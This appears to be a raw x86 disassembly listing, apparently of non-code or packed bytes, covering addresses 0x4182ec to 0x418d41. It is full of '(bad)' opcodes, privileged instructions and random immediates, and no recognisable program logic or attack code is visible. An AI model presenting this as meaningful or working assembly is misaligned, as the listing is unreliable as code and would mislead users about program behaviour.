  4182ec:	ins    DWORD PTR es:[edi],dx
  4182ed:	push   edx
  4182ee:	nop
  4182ef:	sahf   
  4182f0:	in     al,dx
  4182f1:	imul   ebp,DWORD PTR [edx],0x3dad3517
  4182f7:	pop    ss
  4182f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f9:	pop    edx
  4182fa:	stos   DWORD PTR es:[edi],eax
  4182fb:	jmp    0xe5f7d342
  418300:	stos   DWORD PTR es:[edi],eax
  418301:	cmp    esi,DWORD PTR [ecx+0x7fa3ead9]
  418307:	(bad)  
  418309:	dec    ebp
  41830a:	mov    ah,0xe5
  41830c:	jne    0x41831b
  41830e:	lds    ebp,FWORD PTR [edi]
  418310:	lods   eax,DWORD PTR ds:[esi]
  418311:	clc    
  418312:	mov    bh,BYTE PTR [bp+si]
  418315:	(bad)  
  418316:	fwait
  418317:	pusha  
  418318:	push   edi
  418319:	aad    0xc8
  41831b:	jb     0x41829e
  41831d:	bound  ebx,QWORD PTR [eax]
  41831f:	sbb    edx,DWORD PTR [ebx+0x3c]
  418322:	and    dh,BYTE PTR [eax+0x41]
  418325:	dec    ebp
  418326:	sahf   
  418327:	xchg   ecx,eax
  418328:	sub    ebx,DWORD PTR [ebx]
  41832a:	and    al,0xfd
  41832c:	ins    DWORD PTR es:[edi],dx
  41832d:	jns    0x418360
  41832f:	pop    edi
  418330:	ficomp WORD PTR [edi+ebp*1-0x6b]
  418334:	adc    BYTE PTR [edx+0x7e],dl
  418337:	jge    0x4182be
  418339:	mov    bh,0x34
  41833b:	xchg   ecx,eax
  41833c:	xor    eax,0xd59637c8
  418341:	fstp   DWORD PTR [edi+0x726d9737]
  418347:	repz das 
  418349:	arpl   cx,si
  41834b:	idiv   DWORD PTR [ebx]
  41834d:	push   0xffffffa5
  41834f:	ror    BYTE PTR [edi],1
  418351:	xchg   esp,eax
  418352:	(bad)  
  418353:	cmp    ebx,DWORD PTR [ebx-0x3adf3080]
  418359:	mov    ebx,cs
  41835b:	or     ebp,0xbc70074
  418361:	data16 data16 daa 
  418364:	mov    dl,0x2e
  418366:	repnz (bad) 
  418368:	push   ebx
  418369:	xchg   esp,eax
  41836a:	pop    ebp
  41836b:	xchg   edi,eax
  41836c:	int3   
  41836d:	jecxz  0x418305
  41836f:	pusha  
  418370:	push   edi
  418371:	pushf  
  418372:	inc    esp
  418373:	rsm    
  418375:	inc    ebp
  418376:	inc    edi
  418377:	mov    ch,0x40
  418379:	leave  
  41837a:	idiv   al
  41837c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41837d:	pop    es
  41837e:	imul   esp,DWORD PTR [edi],0x100d388f
  418384:	xchg   ebx,ecx
  418386:	and    DWORD PTR [ebx+eiz*1],0x2ea4292f
  41838d:	stos   BYTE PTR es:[edi],al
  41838e:	mov    esp,0xee
	...
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	xchg   edx,eax
  418401:	pop    esi
  418402:	fs jmp 0x104:0x10094
  41840a:	add    BYTE PTR [eax],al
  41840c:	push   0xde572ca1
  418411:	adc    eax,0x33e7a48a
  418416:	aaa    
  418417:	cmp    ebp,DWORD PTR [edi]
  418419:	inc    ecx
  41841a:	jb     0x4183d9
  41841c:	sbb    dl,BYTE PTR [ebp-0x37]
  41841f:	xor    al,ah
  418421:	test   BYTE PTR [edi+0xd13f26e],al
  418427:	sti    
  418428:	lock add al,0xf0
  41842b:	mov    eax,0x4eca5777
  418430:	ss pop edi
  418432:	lock jae 0x41843b
  418435:	xor    ecx,ebx
  418437:	xor    cl,BYTE PTR [esi-0x5ac389d9]
  41843d:	inc    esi
  41843e:	mov    cl,0xc4
  418440:	sar    bh,0x51
  418443:	cld    
  418444:	test   al,0xac
  418446:	retf   
  418447:	push   ecx
  418448:	cmp    ah,cl
  41844a:	push   ss
  41844b:	stc    
  41844c:	sub    eax,0x52435167
  418451:	mov    ds:0x27b579f0,eax
  418456:	mov    al,0x75
  418458:	scas   eax,DWORD PTR es:[edi]
  418459:	fmul   st(7),st
  41845b:	(bad)  
  41845c:	jmp    0x7c0fc85c
  418461:	enter  0xd495,0x8d
  418465:	sbb    ebx,DWORD PTR [eax]
  418467:	mov    al,ds:0x31431e4
  41846c:	loope  0x418488
  41846e:	mov    eax,0x84c923ec
  418473:	scas   eax,DWORD PTR es:[edi]
  418474:	lods   al,BYTE PTR ds:[esi]
  418475:	push   esi
  418476:	dec    esp
  418477:	push   ebx
  418478:	outs   dx,DWORD PTR ds:[esi]
  418479:	aam    0xe7
  41847b:	lahf   
  41847c:	jg     0x418436
  41847e:	lods   al,BYTE PTR ds:[esi]
  41847f:	add    BYTE PTR [ebx],bh
  418481:	push   esi
  418482:	ret    0x17f4
  418485:	cmc    
  418486:	push   ss
  418487:	pop    edi
  418488:	(bad)  
  418489:	mov    ah,0x1c
  41848c:	push   edx
  41848d:	cmp    DWORD PTR [edi-0x5a],0xffffffe9
  418491:	in     eax,0x60
  418493:	loope  0x4184b9
  418495:	fdiv   st(6),st
  418497:	(bad)  
  418498:	mov    ecx,0x738bffd2
  41849d:	xchg   ecx,eax
  41849e:	loopne 0x418438
  4184a0:	data16 shl BYTE PTR [ecx-0x79],0x63
  4184a5:	lods   al,BYTE PTR ds:[esi]
  4184a6:	push   edx
  4184a7:	enter  0x8cba,0xf6
  4184ab:	in     eax,0x22
  4184ad:	icebp  
  4184ae:	pop    es
  4184af:	in     al,0xcc
  4184b1:	jge    0x4184d9
  4184b3:	aaa    
  4184b4:	pushfw 
  4184b6:	gs push 0xffffffe8
  4184b9:	dec    ecx
  4184ba:	and    eax,0xb52ee86
  4184bf:	or     eax,0xb936b8cb
  4184c4:	mov    dl,0x19
  4184c6:	push   ebx
  4184c7:	in     ax,0x6e
  4184ca:	cmp    DWORD PTR [ebx],eax
  4184cc:	sbb    ah,ah
  4184ce:	xchg   ebx,eax
  4184cf:	cmp    eax,DWORD PTR ds:0x7d54ce60
  4184d5:	dec    esp
  4184d6:	imul   esp,DWORD PTR [ebx-0x7e],0xffffff9e
  4184da:	ret    0x583a
  4184dd:	and    eax,0x73170c1f
  4184e2:	push   esp
  4184e3:	pop    ds
  4184e4:	mov    esp,0x21a335f8
  4184e9:	test   BYTE PTR gs:[eax],dl
  4184ec:	dec    eax
  4184ed:	aaa    
  4184ee:	and    DWORD PTR [edi-0x56],0xee1b3593
  4184f5:	das    
  4184f6:	inc    BYTE PTR [esi-0x76]
  4184f9:	ds test dh,al
  4184fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184fd:	(bad)  
  4184fe:	jne    0x418524
  418500:	fimul  DWORD PTR [ebp-0x59]
  418503:	push   0x9bf6e2fc
  418508:	mov    ebx,0x7dfabafa
  41850d:	push   ss
  41850e:	(bad)  
  41850f:	mov    edi,0x0
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	loope  0x4185ed
  418582:	jo     0x418597
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	xor    ebx,DWORD PTR [esi+0x5a]
  41858f:	sub    DWORD PTR [esi],edi
  418591:	frstor [edx+0x18]
  418594:	mov    bl,0xf9
  418596:	ds in  eax,0xc3
  418599:	fwait
  41859a:	retf   
  41859b:	jl     0x418601
  41859d:	xchg   ebp,eax
  41859e:	and    DWORD PTR [ebx-0x7d7a0007],0x5e033a4e
  4185a8:	inc    edi
  4185a9:	push   esp
  4185aa:	pop    ebp
  4185ab:	test   DWORD PTR [edi-0x11],ebx
  4185ae:	mov    esi,0xf339ed
  4185b3:	in     al,dx
  4185b4:	fld    QWORD PTR ds:0x7cd27bd5
  4185ba:	(bad)  
  4185bb:	mov    bl,0x3e
  4185bd:	pop    edi
  4185be:	arpl   WORD PTR [edi-0x53b86715],ax
  4185c4:	jae    0x418640
  4185c6:	pop    eax
  4185c7:	xor    bh,BYTE PTR [esp+eiz*4+0x1c45d306]
  4185ce:	jmp    0xdf4e7bac
  4185d3:	mov    ah,0x52
  4185d5:	pop    edi
  4185d6:	call   0x321:0x3d24d6c4
  4185dd:	lds    esi,FWORD PTR [ecx+0x38abffb1]
  4185e3:	mov    DWORD PTR [esi+0x76],ebx
  4185e6:	mov    al,0xe8
  4185e8:	and    DWORD PTR [ecx],ebp
  4185ea:	out    dx,al
  4185eb:	inc    ebp
  4185ec:	in     al,dx
  4185ed:	int3   
  4185ee:	iret   
  4185ef:	jg     0x418659
  4185f1:	pop    ebp
  4185f2:	rcr    DWORD PTR [esi+eax*8],1
  4185f5:	jle    0x4185dc
  4185f7:	sub    DWORD PTR [ebp+0x66],ebp
  4185fa:	adc    BYTE PTR [edi+esi*8+0x331dca8],ch
  418601:	sbb    edx,edx
  418603:	pop    edi
  418604:	mov    ds:0xd6cf64de,eax
  418609:	data16 mov gs,WORD PTR [ebx+esi*1-0xe21bbb2]
  418611:	ret    0xe43b
  418614:	jp     0x4185d8
  418616:	push   edi
  418617:	je     0x41867c
  418619:	sub    eax,edi
  41861b:	mov    eax,0xade6db3c
  418620:	int    0x3
  418622:	test   DWORD PTR [edx+0x3d],eax
  418625:	pop    esp
  418626:	bound  esi,QWORD PTR [edi]
  418628:	xchg   edx,eax
  418629:	adc    al,0x97
  41862b:	je     0x4185f5
  41862d:	push   ss
  41862e:	jbe    0x4185ed
  418630:	jl     0x418649
  418632:	xchg   esi,eax
  418633:	dec    esi
  418634:	test   eax,0xbd7cec85
  418639:	mov    dl,BYTE PTR [eax+0x2bc5178e]
  41863f:	pop    ebp
  418640:	jmp    0x31f3:0x133e8623
  418647:	jne    0x418676
  418649:	popf   
  41864a:	icebp  
  41864b:	jp     0x41861c
  41864d:	cli    
  41864e:	xor    DWORD PTR ds:0xbe9e2771,ebp
  418654:	cmc    
  418655:	test   BYTE PTR [ecx-0x68dd2b33],al
  41865b:	dec    edi
  41865c:	inc    edi
  41865d:	dec    esi
  41865e:	out    0x7d,eax
  418660:	fisub  WORD PTR ds:0xcd718f3c
  418666:	xchg   ebp,eax
  418667:	jge    0x4186af
  418669:	mov    BYTE PTR ds:0xaa0909e5,ah
  41866f:	test   al,dh
  418671:	add    BYTE PTR [ebx],ch
  418673:	or     BYTE PTR [ebp-0x76],dl
  418676:	and    ecx,esp
  418678:	lods   al,BYTE PTR ds:[esi]
  418679:	mov    ds:0x51dae950,eax
  41867e:	jns    0x4186f0
  418680:	rcr    DWORD PTR [eax-0x2f],0xc5
  418684:	dec    ebx
  418685:	inc    eax
  418686:	imul   esp,ebx,0xfffffffc
  418689:	or     ecx,DWORD PTR [esi]
  41868b:	jno    0x41870b
  41868d:	dec    esp
  41868e:	dec    edi
  41868f:	add    DWORD PTR [eax],eax
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	sti    
  418701:	sbb    BYTE PTR [ebx],bl
  418703:	jns    0x4186a1
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	cmp    dh,BYTE PTR [eax]
  41870e:	mov    ecx,0x1fcaeb78
  418713:	retf   
  418714:	or     esi,DWORD PTR [ecx]
  418716:	jl     0x41875b
  418718:	cld    
  418719:	adc    DWORD PTR ds:0xb16b6ef7,esp
  41871f:	push   es
  418720:	push   esp
  418721:	xor    BYTE PTR [ebx+ecx*4+0x13],dl
  418725:	mov    DWORD PTR [eax+0x18],ecx
  418728:	(bad)  
  41872a:	leave  
  41872b:	addr16 pop esp
  41872d:	inc    esp
  41872e:	dec    edi
  41872f:	out    dx,eax
  418730:	pop    ss
  418731:	xchg   DWORD PTR [esi+0x29],eax
  418734:	stos   BYTE PTR es:[edi],al
  418735:	pop    edx
  418736:	pushf  
  418737:	mov    al,ds:0xe74b49d5
  41873c:	jo     0x418765
  41873e:	dec    eax
  41873f:	xchg   edx,eax
  418740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418741:	pop    edi
  418742:	sbb    DWORD PTR ds:0xe2e3ef43,ebp
  418748:	or     DWORD PTR [eax+0x1e],esp
  41874b:	sbb    DWORD PTR [ecx],esi
  41874d:	jp     0x4186fa
  41874f:	in     eax,dx
  418750:	dec    edi
  418751:	xchg   ebx,eax
  418752:	je     0x4186fe
  418754:	dec    ecx
  418755:	stos   BYTE PTR es:[edi],al
  418756:	dec    eax
  418757:	shr    DWORD PTR ds:0x8ebf5045,cl
  41875d:	in     al,0xd
  41875f:	repnz and BYTE PTR [eax+ebp*1+0x23],dh
  418764:	scas   eax,DWORD PTR es:[edi]
  418765:	adc    al,0x64
  418767:	push   0x92f37b29
  41876c:	push   esp
  41876d:	(bad)  
  41876e:	mov    eax,0x259f9356
  418773:	push   0xa02ce8a5
  418778:	pushf  
  418779:	lods   al,BYTE PTR ds:[esi]
  41877a:	lds    eax,FWORD PTR gs:[ebx+eiz*4+0xa8c38a8]
  418782:	mov    al,ds:0x4cce3e81
  418787:	call   0x6ba9:0xbc071b10
  41878e:	jmp    0x1a688961
  418793:	jb     0x418729
  418795:	aam    0x94
  418797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418798:	mov    edi,0xe859f71d
  41879d:	aas    
  41879e:	adc    DWORD PTR [eax-0x165fe1fb],edi
  4187a4:	xor    DWORD PTR [ebp+0x3838db0f],ebp
  4187aa:	repz push edi
  4187ac:	or     dh,dl
  4187ae:	push   ebx
  4187af:	adc    eax,0x589c6bdb
  4187b4:	cs int3 
  4187b6:	mov    dl,0x80
  4187b8:	xchg   ecx,eax
  4187b9:	not    DWORD PTR ds:0x146d604c
  4187bf:	jmp    0x4187d7
  4187c1:	add    bl,al
  4187c3:	push   ss
  4187c4:	push   ebx
  4187c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c6:	shl    ebx,cl
  4187c8:	jp     0x4187c0
  4187ca:	mov    bl,0x9d
  4187cc:	into   
  4187cd:	in     eax,dx
  4187ce:	repnz push esi
  4187d0:	sbb    al,bh
  4187d2:	or     al,0x31
  4187d4:	pop    edi
  4187d5:	cld    
  4187d6:	stos   BYTE PTR es:[edi],al
  4187d7:	stc    
  4187d8:	mov    ds:0xb1634465,al
  4187dd:	fild   QWORD PTR [eax+0x25]
  4187e0:	sub    BYTE PTR [ebx+0x3ec404a1],dl
  4187e6:	fadd   DWORD PTR [esi+ecx*1-0x38628754]
  4187ed:	jle    0x4187c0
  4187ef:	lods   al,BYTE PTR ds:[esi]
  4187f0:	fucomip st,st(1)
  4187f2:	push   0x39
  4187f4:	jl     0x4187f3
  4187f6:	jecxz  0x4187fe
  4187f8:	jp     0x41883f
  4187fa:	lods   al,BYTE PTR ds:[esi]
  4187fb:	les    edi,FWORD PTR [ecx+ebp*8]
  4187fe:	and    eax,0xe7f3fce6
  418803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418804:	les    edi,FWORD PTR [ecx+0x38]
  418807:	mov    dh,0xf7
  418809:	pop    esp
  41880a:	inc    esi
  41880b:	pop    eax
  41880c:	mov    ah,0xf8
  41880e:	inc    edx
  41880f:	aad    0x0
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x2163c533]
  418881:	xchg   ecx,eax
  418883:	pop    edi
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [esi-0x588256ed],dh
  418891:	adc    cl,BYTE PTR [ecx+0x53c74e5f]
  418897:	out    0xcf,eax
  418899:	cmc    
  41889a:	gs dec ebx
  41889c:	mov    al,0x56
  41889e:	shl    DWORD PTR [ebx-0x31],1
  4188a1:	inc    esp
  4188a2:	add    al,0xbc
  4188a4:	icebp  
  4188a5:	xchg   ecx,eax
  4188a6:	loope  0x4188d4
  4188a8:	mov    bh,0x96
  4188aa:	arpl   WORD PTR ds:0xcfef43f9,sp
  4188b0:	nop
  4188b1:	test   BYTE PTR [esi+0x74c45f31],al
  4188b7:	arpl   WORD PTR [ebp+0x23],cx
  4188ba:	xor    BYTE PTR [esi],0x8d
  4188bd:	test   eax,0xd6532663
  4188c2:	scas   eax,DWORD PTR es:[edi]
  4188c3:	adc    al,0x23
  4188c5:	aad    0x2
  4188c7:	mov    ?,WORD PTR [ecx]
  4188c9:	mov    eax,ds:0x31b6932d
  4188ce:	fisub  WORD PTR [ebx]
  4188d0:	mov    ds:0xd8ee4471,al
  4188d5:	dec    edx
  4188d6:	mov    edx,0xb42119b7
  4188db:	lea    edi,[ebp-0x55]
  4188de:	mov    ecx,0x31f63512
  4188e3:	lods   al,BYTE PTR ds:[si]
  4188e5:	push   es
  4188e6:	mov    dh,0xb7
  4188e8:	outs   dx,BYTE PTR ds:[esi]
  4188e9:	sbb    al,0x3c
  4188eb:	test   dl,ah
  4188ed:	hlt    
  4188ee:	outs   dx,BYTE PTR ds:[esi]
  4188ef:	shl    BYTE PTR [ebx+0x6eecf7d],cl
  4188f5:	jp     0x41891a
  4188f7:	stos   DWORD PTR es:[edi],eax
  4188f8:	mov    al,0x8d
  4188fa:	pop    ecx
  4188fb:	xlat   BYTE PTR ds:[ebx]
  4188fc:	fst    DWORD PTR [ebp-0x8817ba2]
  418902:	mov    ebx,0x65678a33
  418907:	clc    
  418908:	sbb    al,0x2d
  41890a:	push   esi
  41890b:	icebp  
  41890c:	adc    al,0xf8
  41890e:	xchg   BYTE PTR [ebp+ebp*8+0x320401d0],dl
  418915:	push   ebx
  418916:	ins    DWORD PTR es:[edi],dx
  418917:	(bad)  
  418919:	mov    ebp,0xdd8ea26f
  41891e:	sub    bh,dh
  418920:	shl    BYTE PTR [ebp+0x11c7d03b],cl
  418926:	outs   dx,BYTE PTR ds:[esi]
  418927:	in     al,0x2b
  418929:	xor    eax,DWORD PTR [ecx]
  41892b:	xlat   BYTE PTR ds:[ebx]
  41892c:	jae    0x418994
  41892e:	pop    ecx
  41892f:	pop    ebx
  418930:	push   eax
  418931:	jo     0x4188f3
  418933:	pusha  
  418934:	int    0xb1
  418936:	ins    BYTE PTR es:[edi],dx
  418937:	pop    ds
  418938:	mov    ebx,0x3207b863
  41893d:	inc    ebp
  41893e:	mov    ecx,0x3f81f9d2
  418943:	sbb    edi,DWORD PTR [ebp+0x4a]
  418946:	adc    eax,0xd6ea62a7
  41894b:	jno    0x4188ee
  41894d:	add    BYTE PTR [edx-0x217d9eb1],al
  418953:	pop    esp
  418954:	sub    eax,0x9b32cf2b
  418959:	adc    BYTE PTR [edi+eiz*2-0x5102cedd],al
  418960:	mov    ecx,0x84b109b9
  418965:	pop    eax
  418966:	mov    bl,BYTE PTR [ebp+0x7]
  418969:	add    DWORD PTR ds:0x48b27e19,esp
  41896f:	test   eax,0xb66f37c6
  418974:	or     DWORD PTR [eax*8+0x2ea60c71],eax
  41897b:	inc    esp
  41897c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41897d:	js     0x41898d
  41897f:	cs jo  0x41899c
  418982:	xchg   edi,eax
  418983:	scas   al,BYTE PTR es:[edi]
  418984:	xchg   esi,eax
  418985:	icebp  
  418986:	push   0x7efa45b6
  41898b:	add    DWORD PTR [eax+0x46d6bd],esi
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xafaf8e69
  418a03:	shl    BYTE PTR [esp+eax*1+0x1040001],0x0
  418a0b:	add    BYTE PTR [ebx],ch
  418a0d:	cmp    esp,DWORD PTR [ebx]
  418a0f:	dec    edx
  418a10:	mov    ah,dl
  418a12:	cmp    DWORD PTR [ebp+ecx*4-0x1b],ecx
  418a16:	fisttp QWORD PTR [ecx]
  418a18:	mov    BYTE PTR [ecx-0x3e321df4],ch
  418a1e:	fwait
  418a1f:	push   cs
  418a20:	mov    dh,0x36
  418a22:	inc    ebx
  418a23:	ds or  al,0xe6
  418a26:	pop    edx
  418a27:	push   edx
  418a28:	cdq    
  418a29:	loopne 0x4189d0
  418a2b:	mov    ds,WORD PTR [ebx+0x3c]
  418a2e:	lahf   
  418a2f:	loope  0x4189b1
  418a31:	xor    eax,0x738771e0
  418a36:	test   BYTE PTR [edi],ah
  418a38:	vmwrite ecx,DWORD PTR [ecx]
  418a3b:	inc    eax
  418a3c:	xor    ch,ch
  418a3e:	pop    esp
  418a3f:	xlat   BYTE PTR ds:[ebx]
  418a40:	cmp    DWORD PTR [edi+0x1f],edi
  418a43:	mov    ch,0x9b
  418a45:	icebp  
  418a46:	icebp  
  418a47:	dec    edi
  418a48:	leave  
  418a49:	cwde   
  418a4a:	mov    dh,dh
  418a4c:	xor    al,0xc4
  418a4e:	dec    esi
  418a4f:	rcl    esp,0xf0
  418a52:	mov    ebx,0xc6a3409b
  418a57:	mov    edi,cr1
  418a5a:	mov    esi,0x6c6a4ea5
  418a5f:	stc    
  418a60:	or     BYTE PTR [ebx],0xec
  418a63:	or     eax,0x27cdb99c
  418a68:	jbe    0x418a84
  418a6a:	shr    ecx,cl
  418a6c:	(bad)  
  418a6d:	rol    BYTE PTR [edx],0xca
  418a70:	inc    edi
  418a71:	cmp    al,0x7b
  418a73:	push   0xa621ca10
  418a78:	dec    ecx
  418a79:	ds jmp 0x418a5c
  418a7c:	aam    0xfe
  418a7e:	dec    esp
  418a7f:	cmp    eax,0xdd0fa6a0
  418a84:	shl    dl,0xd1
  418a87:	cdq    
  418a88:	dec    edi
  418a89:	xor    BYTE PTR [ebx+0xc743011],0x3f
  418a90:	mov    eax,edi
  418a92:	stc    
  418a93:	lods   eax,DWORD PTR ds:[esi]
  418a94:	add    BYTE PTR [eax-0x52d7e681],0xd7
  418a9b:	mov    al,0xc6
  418a9d:	(bad)  [edi]
  418a9f:	sub    DWORD PTR [ebp-0x18],esi
  418aa2:	mov    ecx,0x79431e5f
  418aa7:	daa    
  418aa8:	mov    ecx,esp
  418aaa:	and    dl,BYTE PTR [eax]
  418aac:	xor    al,0xa1
  418aae:	pop    ds
  418aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab0:	push   esi
  418ab1:	adc    ebx,edi
  418ab3:	xor    al,BYTE PTR [eax-0x63]
  418ab6:	aad    0x35
  418ab8:	out    0x6f,eax
  418aba:	stc    
  418abb:	pop    edi
  418abc:	fisubr DWORD PTR [edx-0x24605395]
  418ac2:	mov    dl,0x98
  418ac4:	jp     0x418a62
  418ac6:	pop    ss
  418ac7:	ss aad 0xb3
  418aca:	sbb    DWORD PTR [esi-0x20],ecx
  418acd:	dec    ebx
  418ace:	adc    DWORD PTR [edx+0x70],0xffffffb7
  418ad2:	sub    eax,0xa2ca20b9
  418ad7:	xlat   BYTE PTR ds:[ebx]
  418ad8:	rcl    BYTE PTR [ecx],cl
  418ada:	jge    0x418b2f
  418adc:	lods   al,BYTE PTR ds:[esi]
  418add:	and    ecx,DWORD PTR [eax+0x4f]
  418ae0:	sbb    eax,0xcca743a9
  418ae5:	inc    ebx
  418ae6:	add    eax,0x80a1a77a
  418aeb:	mov    ecx,0xf63d91b6
  418af0:	cmp    BYTE PTR [eax],ah
  418af2:	ss jl  0x418aa3
  418af5:	jp     0x418b51
  418af7:	pop    ds
  418af8:	jecxz  0x418aa5
  418afa:	out    0xdc,eax
  418afc:	push   ecx
  418afd:	lods   eax,DWORD PTR ds:[esi]
  418afe:	xchg   BYTE PTR gs:[edx],dl
  418b01:	call   0xfbe1:0x695257e9
  418b08:	jmp    0x418b0a
  418b0a:	pusha  
  418b0b:	ss fwait
  418b0d:	add    edx,DWORD PTR [ebp+0x4d]
	...
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x9b
  418b81:	leave  
  418b82:	jnp    0x418bff
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	xlat   BYTE PTR ds:[ebx]
  418b8d:	jno    0x418b9d
  418b8f:	inc    eax
  418b90:	repz sar DWORD PTR [esi-0x35497c24],1
  418b97:	out    0x9e,al
  418b99:	sar    BYTE PTR [edx],1
  418b9b:	ret    
  418b9c:	aaa    
  418b9d:	and    DWORD PTR [eax-0x5f],ebp
  418ba0:	test   DWORD PTR [ebp-0x46b94590],eax
  418ba6:	dec    ecx
  418ba7:	fwait
  418ba8:	outs   dx,DWORD PTR ds:[esi]
  418ba9:	push   edi
  418baa:	adc    BYTE PTR [eax+0x41],dh
  418bad:	inc    esp
  418bae:	je     0x418b3f
  418bb0:	jmp    0x418b6e
  418bb2:	add    al,0x6e
  418bb4:	mov    dh,0x26
  418bb6:	add    ebx,ebp
  418bb8:	add    BYTE PTR [esi-0x3eedea17],dh
  418bbe:	xor    BYTE PTR [edx-0x51],0x84
  418bc2:	js     0x418bc3
  418bc4:	aas    
  418bc5:	sbb    al,0x1d
  418bc7:	ret    
  418bc8:	mov    al,0x83
  418bca:	gs mov al,0x27
  418bcd:	(bad)  
  418bce:	push   ebx
  418bcf:	arpl   WORD PTR [ebx+0x20],dx
  418bd2:	pop    ds
  418bd3:	and    BYTE PTR [edi],0x5e
  418bd6:	cmp    edx,esp
  418bd8:	mov    ebp,0x5eb3549b
  418bdd:	les    esi,FWORD PTR [edi+0x4549330a]
  418be3:	aad    0x35
  418be5:	pop    ebp
  418be7:	jl     0x418c16
  418be9:	push   eax
  418bea:	pushf  
  418beb:	not    BYTE PTR [eax+0x8]
  418bee:	fcom   DWORD PTR [ecx]
  418bf0:	rcl    ebx,0x66
  418bf3:	push   0x17b8c68b
  418bf8:	mov    ds:0x72ae99b1,eax
  418bfd:	fisttp DWORD PTR [ecx]
  418bff:	dec    ecx
  418c00:	call   0x36712680
  418c05:	sub    eax,0x8e87f7f
  418c0a:	jbe    0x418c0b
  418c0c:	ds add al,0x78
  418c0f:	test   bl,0xc3
  418c12:	and    edi,eax
  418c14:	imul   esp,DWORD PTR [edx-0x2e533918],0x23
  418c1b:	in     al,dx
  418c1c:	lods   eax,DWORD PTR ds:[esi]
  418c1d:	and    DWORD PTR [ebp+0x1d],eax
  418c20:	pop    ecx
  418c21:	push   ds
  418c22:	cwde   
  418c23:	adc    al,0xa9
  418c25:	mov    cl,0xf5
  418c27:	pop    ds
  418c28:	mov    esp,0x537c7989
  418c2d:	test   eax,0x3b76f8e4
  418c32:	adc    BYTE PTR [edx+0x4e6299a5],ch
  418c38:	sub    eax,DWORD PTR [eax]
  418c3a:	adc    dh,dl
  418c3c:	aam    0xfd
  418c3e:	sub    dh,bh
  418c40:	(bad)  
  418c41:	out    dx,al
  418c42:	stc    
  418c43:	in     al,dx
  418c44:	(bad)  
  418c45:	ret    0x980b
  418c48:	or     al,0x42
  418c4a:	pop    ds
  418c4b:	mov    al,ds:0x5b5cfb6c
  418c50:	das    
  418c51:	loopne 0x418c76
  418c53:	inc    ecx
  418c54:	inc    eax
  418c55:	bound  ecx,QWORD PTR [eax-0x6acd8c6a]
  418c5b:	hlt    
  418c5c:	dec    edx
  418c5d:	stc    
  418c5e:	sti    
  418c5f:	dec    eax
  418c60:	cmp    eax,0x8e054f06
  418c65:	jmp    0x9ede:0xc9e75c2e
  418c6c:	sbb    al,0x34
  418c6e:	les    ebx,FWORD PTR [ebp+0x5f]
  418c71:	xchg   edx,eax
  418c72:	pop    edi
  418c73:	shr    DWORD PTR [ebx+0x7],cl
  418c76:	fcmovu st,st(2)
  418c78:	mov    dl,0x3
  418c7a:	xchg   esp,eax
  418c7b:	and    eax,0x7fcd2941
  418c80:	mov    eax,0x42a7df53
  418c85:	xchg   esp,eax
  418c86:	mov    bh,0xd7
  418c88:	sbb    dl,al
  418c8a:	xchg   ah,dl
  418c8c:	push   esp
  418c8d:	ds faddp st(3),st
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcl    BYTE PTR [edi-0x58],cl
  418d02:	stos   DWORD PTR es:[edi],eax
  418d03:	cmp    ch,BYTE PTR [esi+eax*1+0x1040001]
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	call   0x124b:0x1696b3cf
  418d13:	xchg   esp,eax
  418d14:	out    dx,eax
  418d15:	mov    dl,0x62
  418d17:	cmp    DWORD PTR [edi+eax*2-0x5885753b],eax
  418d1e:	aam    0x91
  418d20:	adc    bl,BYTE PTR [ebx+0x1b]
  418d23:	push   edi
  418d24:	inc    esp
  418d25:	xchg   ecx,eax
  418d26:	out    0x75,al
  418d28:	dec    esp
  418d29:	mov    ds:0x8810b8a4,eax
  418d2e:	jle    0x418ced
  418d30:	fcomp  DWORD PTR [esi]
  418d32:	repnz or ebp,ecx
  418d35:	pop    ebp
  418d36:	xchg   esi,eax
  418d37:	add    DWORD PTR [ebx],esi
  418d39:	cmp    edi,0xffffffb3
  418d3c:	mov    esi,0x97fd23e1
  418d41:	out    0xfd,al
